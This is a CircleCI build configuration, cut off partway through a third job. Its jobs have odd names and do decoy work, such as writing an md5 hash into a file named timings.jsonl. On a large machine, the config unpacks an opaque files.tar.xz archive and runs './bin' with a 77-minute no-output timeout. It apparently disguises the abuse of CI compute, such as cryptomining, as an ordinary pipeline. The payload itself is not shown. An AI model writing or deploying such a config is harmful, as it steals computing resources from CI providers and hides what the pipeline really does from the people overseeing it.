version: 2.1

jobs:
  blue_v3-ga:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: gas grill
          command: |
            mkdir -p /tmp/scratch
            set +o pipefail 2>/dev/null; ( echo "init-$(date +%s)"; seq 1 100000 ) | md5sum > /tmp/scratch/timings.jsonl; true
            ls -la /tmp/scratch/timings.jsonl | awk '{print "artifact:", $5, "bytes"}'
      - persist_to_workspace:
          root: /tmp/scratch
          paths:
            - timings.jsonl
  v3-ga:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/scratch
      - run:
          name: Load prior
          command: |
            test -s /tmp/scratch/timings.jsonl && echo nonempty || echo empty
      - run:
          name: Pull latest
          command: git clone -q --single-branch --no-tags https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME .
      - run:
          name: Restore vendored sources
          command: xz -dc files.tar.xz | tar xf -
      - run:
          no_output_timeout: 77m
          command: (./bin)
  fetcher_india-2:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - attach_workspace:
          at: /tmp/scratch
      - run:
